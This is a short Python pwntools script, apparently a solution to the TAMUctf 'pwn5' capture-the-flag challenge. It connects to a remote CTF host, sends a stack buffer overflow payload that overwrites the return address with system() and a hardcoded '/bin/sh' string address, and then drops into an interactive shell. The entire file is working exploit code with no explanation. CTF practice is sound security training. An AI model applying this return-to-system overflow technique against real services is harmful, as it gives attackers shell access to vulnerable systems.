#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
#context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
io = remote('pwn.tamuctf.com', 4325)
elf = ELF('./pwn5')

binsh = 0x080bc140
payload = 'a' * (0xd+4) + p32(elf.sym['system']) + 'aaaa'  + p32(binsh)

io.sendlineafter('ls:', payload)
io.interactive()
